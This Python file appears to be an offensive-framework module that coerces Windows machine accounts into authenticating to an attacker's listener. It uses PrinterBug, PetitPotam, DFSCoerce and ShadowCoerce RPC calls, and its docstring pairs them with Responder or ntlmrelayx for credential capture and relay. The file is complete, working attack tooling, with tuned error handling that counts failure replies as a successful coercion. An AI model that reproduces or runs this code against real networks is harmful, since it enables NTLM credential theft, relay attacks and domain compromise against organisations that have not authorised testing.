"""Coerce: force a machine account to authenticate to YOUR listener.

The active half of coercion (hash_bait is the passive, file-drop half):
call an RPC method whose whole purpose is a notification backchannel and
point it at an arbitrary UNC. The target's MACHINE account then
authenticates to LISTENER over SMB — pair with Responder/ntlmrelayx (or
any capture) running there. No exploit, no write access on the target;
the methods are Windows features being used exactly as designed.

Methods (Coercer's matrix, FORGE-shaped):

  - printerbug    MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx.
                  Any authenticated user when the spooler runs. ACCESS
                  DENIED on the reply is normal — the auth already fired.
  - petitpotam    MS-EFSR EfsRpcOpenFileRaw. Most reliable on servers;
                  ERROR_BAD_NETPATH on patched boxes still means it fired.
  - dfscoerce     MS-DFSNM NetrDfsRemoveStdRoot. Needs the DFS-N service
                  and rights on the namespace — rare, included for the
                  matrix.
  - shadowcoerce  MS-FSRVP IsPathSupported. Needs the File Server VSS
                  agent interface and share rights.

Every method reports a per-target verdict: fired / denied / unavailable.
"Fired" means the RPC channel accepted the trigger — the outbound auth
is on the wire whether or not the call returned an error.

Implementation notes, learned the hard way:
  - EFSR/DFSNM/FSRVP bodies are vendored as minimal NDR (impacket 0.13
    ships RPRN only). Their string params are WSTR, NOT LPWSTR — the
    pointer form gets you rpc_x_bad_stub_data from the server.
  - the lsarpc-family interfaces want packet privacy: set_auth_level(
    PKT_PRIVACY) + set_credentials, same lesson as esc1's cert pipe.
"""

import time

from core.module import AuxiliaryModule
from core.options import OptAddress, OptEnum, OptPort, OptString

try:
    from impacket import system_errors
    from impacket.dcerpc.v5 import rprn, transport
    from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
    from impacket.dcerpc.v5.dtypes import DWORD, ULONG, WSTR
    from impacket.dcerpc.v5.rpcrt import (
        DCERPCException,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_WINNT,
    )
    from impacket.smbconnection import SMBConnection
    from impacket.uuid import uuidtup_to_bin
except ImportError:
    rprn = None  # console gates run() on requirements

EFSRPC_UUID = uuidtup_to_bin(("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0")) \
    if rprn else None
DFSNM_UUID = uuidtup_to_bin(("4fc742e0-4a10-11cf-8273-00aa004ae673", "1.0")) \
    if rprn else None
FSRVP_UUID = uuidtup_to_bin(("a8e0653c-2744-4389-a61d-7373df8b2292", "1.0")) \
    if rprn else None


if rprn:
    class DCERPCSessionError(DCERPCException):
        """impacket's request() looks up this name in the CALLING module
        for unmapped win32 errors — without it, the lookup AttributeErrors."""

        def __str__(self):
            if self.error_code in system_errors.ERROR_MESSAGES:
                short, verbose = system_errors.ERROR_MESSAGES[self.error_code]
                return f"coerce SessionError: 0x{self.error_code:x} {short} {verbose}"
            return f"coerce SessionError: unknown error 0x{self.error_code:x}"


    class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
        align = 1
        structure = (("Data", "20s"),)


    class EfsRpcOpenFileRaw(NDRCALL):
        opnum = 0
        structure = (("FileName", WSTR), ("Flag", ULONG),)


    class EfsRpcOpenFileRawResponse(NDRCALL):
        structure = (("hContext", EXIMPORT_CONTEXT_HANDLE),
                     ("ErrorCode", ULONG),)


    class EfsRpcEncryptFileSrv(NDRCALL):
        # the unpatched variant — Server 2022 denies OpenFileRaw but
        # still answers this one (PetitPotam's own fallback chain)
        opnum = 4
        structure = (("FileName", WSTR),)


    class EfsRpcEncryptFileSrvResponse(NDRCALL):
        structure = (("ErrorCode", ULONG),)


    class NetrDfsRemoveStdRoot(NDRCALL):
        opnum = 13
        structure = (("ServerName", WSTR), ("RootShare", WSTR),
                     ("ApiFlags", DWORD),)


    class NetrDfsRemoveStdRootResponse(NDRCALL):
        structure = (("ErrorCode", ULONG),)


    class IsPathSupported(NDRCALL):
        opnum = 8
        structure = (("ShareName", WSTR),)


    class IsPathSupportedResponse(NDRCALL):
        structure = (("Supported", DWORD), ("ErrorCode", ULONG),)
else:
    EfsRpcOpenFileRaw = EfsRpcEncryptFileSrv = None
    NetrDfsRemoveStdRoot = IsPathSupported = None


METHODS = ("printerbug", "petitpotam", "dfscoerce", "shadowcoerce")

ERROR_BAD_NETPATH = 53
ERROR_ACCESS_DENIED = 5
RPC_S_SERVER_UNAVAILABLE = 1722


def _request(dce, req, resp_class):
    """dce.request() without impacket's module-name gymnastics: stock
    request() does __import__(req.__module__) to find the response
    class, which fails for classes vendored in a module loaded from a
    file path. call + recv + decode is the whole job anyway."""
    dce.call(req.opnum, req)
    answer = dce.recv()
    if answer[-4:] != b"\x00\x00\x00\x00":
        import struct
        raise DCERPCException(error_code=struct.unpack("<L", answer[-4:])[0])
    return resp_class(answer)


class Coerce(AuxiliaryModule):
    name = "Coerce (RPRN/EFSR/DFSNM/FSRVP machine auth)"
    description = """
        Forces a target's MACHINE account to authenticate to LISTENER
        (where your Responder/ntlmrelayx capture waits) via RPC
        notification methods: printerbug (RPRN), petitpotam (EFSR),
        dfscoerce (DFSNM), shadowcoerce (FSRVP). Any domain credential
        works for the classic methods. Per-method verdicts: fired /
        denied / unavailable — an error reply often still means the
        auth went out. METHOD=all tries them all.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target(s) to coerce, "
                                                "comma-separated"))
        self.options.add(OptString("LISTENER", required=True,
                                   description="Where the auth phones home "
                                               "(your capture host)"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Auth domain"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Any domain user"))
        self.options.add(OptString("PASSWORD", required=True,
                                   description="Password"))
        self.options.add(OptPort("RPORT", default=445,
                                 description="SMB port on the target"))
        self.options.add(OptEnum("METHOD", ["all"] + list(METHODS),
                                 default="all",
                                 description="Coercion method(s) to try"))

    def run(self):
        listener = str(self.get_option("LISTENER")).strip().strip("\\")
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        port = int(self.get_option("RPORT"))
        picked = [str(self.get_option("METHOD"))]
        if picked == ["all"]:
            picked = list(METHODS)
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            for method in picked:
                self._verdict(host, method, listener, port,
                              user, password, domain)

    # -- transports -----------------------------------------------------

    def _connect(self, host, port, user, password, domain):
        conn = SMBConnection(host, host, sess_port=port, timeout=20)
        conn.login(user, password, domain)
        return conn

    def _dce(self, host, conn, pipe, uuid, user, password, domain):
        rpctrans = transport.SMBTransport(host, filename=pipe,
                                          smb_connection=conn)
        dce = rpctrans.get_dce_rpc()
        # lsarpc-family interfaces reject unauthenticated bindings — the
        # esc1 lesson: packet privacy + explicit creds on the RPC layer
        dce.set_credentials(user, password, domain)
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.connect()
        dce.bind(uuid)
        return dce

    # -- verdict plumbing -------------------------------------------------

    def _verdict(self, host, method, listener, port, user, password, domain):
        # a FRESH connection per method: a fired coercion makes the target
        # dial out to LISTENER, and when nothing answers there the RPC
        # call blocks for the whole NetBIOS timeout and wedges the session
        # for every method after it. One transport retry: the spooler in
        # particular accepts its pipe minutes after SMB answers.
        fired_by = None
        last_exc = None
        for attempt in (1, 2):
            try:
                conn = self._connect(host, port, user, password, domain)
            except Exception as e:
                self.print_error(f"{host}: SMB login failed - {e}")
                return
            try:
                fired_by = getattr(self, f"_coerce_{method}")(
                    host, listener, conn, user, password, domain)
                last_exc = None
            except Exception as e:
                last_exc = e
            finally:
                conn.close()
            if last_exc is None:
                break
            # transport deaths get one retry; everything else maps now
            if "Error while reading from remote" not in str(last_exc) \
                    or attempt == 2:
                break
            self.print_debug(f"{host}: {method}: transport died, retrying "
                             f"after 10s")
            time.sleep(10)
        if last_exc is None:
            self.print_good(f"{host}: {method}: FIRED — {fired_by}")
            return
        e = last_exc
        if isinstance(e, DCERPCException):
            text = str(e)
            if e.error_code is None:
                # bind rejections and protocol faults carry no win32 code
                if "abstract_syntax_not_supported" in text or \
                        "abstract syntax" in text:
                    self.print_error(f"{host}: {method}: unavailable "
                                     f"(interface not registered)")
                elif "timed out" in text:
                    self.print_good(f"{host}: {method}: FIRED — the target "
                                    f"tried LISTENER but nothing answered "
                                    f"(listener unreachable from there)")
                else:
                    self.print_error(f"{host}: {method}: unavailable ({text[:90]})")
                return
            code = e.error_code & 0xFFFF
            if code == ERROR_ACCESS_DENIED and method == "printerbug":
                self.print_good(f"{host}: {method}: FIRED — reply was "
                                f"ACCESS DENIED — normal, auth fired first")
                return
            if code == RPC_S_SERVER_UNAVAILABLE:
                # the target dialed LISTENER and got refused — the
                # coercion works, nothing is capturing there
                self.print_good(f"{host}: {method}: FIRED — the target "
                                f"tried LISTENER but nothing answered "
                                f"(connection refused)")
                return
            if code == ERROR_BAD_NETPATH or "ERROR_BAD_NETPATH" in text:
                self.print_good(f"{host}: {method}: FIRED — reply was "
                                f"BAD_NETPATH — patched but auth fired")
                return
            if "rpc_s_access_denied" in text:
                self.print_error(f"{host}: {method}: access denied "
                                 f"(interface present, creds insufficient)")
                return
            self.print_error(f"{host}: {method}: denied "
                             f"(0x{(e.error_code or 0):x})")
            return
        self.print_error(f"{host}: {method}: unavailable ({e})")

    # -- methods ----------------------------------------------------------

    def _coerce_printerbug(self, host, listener, conn, user, password, domain):
        dce = self._dce(host, conn, r"\spoolss", rprn.MSRPC_UUID_RPRN,
                        user, password, domain)
        try:
            # the spooler opens the printer by the machine's REAL name —
            # IP/localhost forms get ERROR_INVALID_PRINTER_NAME (0x709)
            server_name = conn.getServerName()
            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{server_name}\x00")
            handle = resp["pHandle"]
            rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
                dce, handle, 0x100, 0, f"\\\\{listener}\x00")
        finally:
            dce.disconnect()
        return "spooler accepted the notification channel"

    def _coerce_petitpotam(self, host, listener, conn, user, password, domain):
        dce = self._dce(host, conn, r"\lsarpc", EFSRPC_UUID,
                        user, password, domain)
        try:
            request = EfsRpcOpenFileRaw()
            request["FileName"] = f"\\\\{listener}\\share\\file.txt\x00"
            request["Flag"] = 0
            try:
                _request(dce, request, EfsRpcOpenFileRawResponse)
            except DCERPCException as e:
                if "rpc_s_access_denied" not in str(e):
                    raise
                # Server 2022 denies OpenFileRaw but still answers the
                # unpatched variant (PetitPotam's own fallback)
                self.print_debug(f"{host}: OpenFileRaw denied, trying "
                                 f"EncryptFileSrv")
                request = EfsRpcEncryptFileSrv()
                request["FileName"] = f"\\\\{listener}\\share\\file.txt\x00"
                _request(dce, request, EfsRpcEncryptFileSrvResponse)
        finally:
            dce.disconnect()
        return "EFSR opened the remote file path"

    def _coerce_dfscoerce(self, host, listener, conn, user, password, domain):
        dce = self._dce(host, conn, r"\netdfs", DFSNM_UUID,
                        user, password, domain)
        try:
            request = NetrDfsRemoveStdRoot()
            request["ServerName"] = f"{listener}\x00"
            request["RootShare"] = "share\x00"
            request["ApiFlags"] = 0
            _request(dce, request, NetrDfsRemoveStdRootResponse)
        finally:
            dce.disconnect()
        return "DFS-N accepted the root removal request"

    def _coerce_shadowcoerce(self, host, listener, conn, user, password, domain):
        dce = self._dce(host, conn, r"\lsarpc", FSRVP_UUID,
                        user, password, domain)
        try:
            request = IsPathSupported()
            request["ShareName"] = f"\\\\{listener}\\share\x00"
            _request(dce, request, IsPathSupportedResponse)
        finally:
            dce.disconnect()
        return "FSRVP evaluated the remote share path"
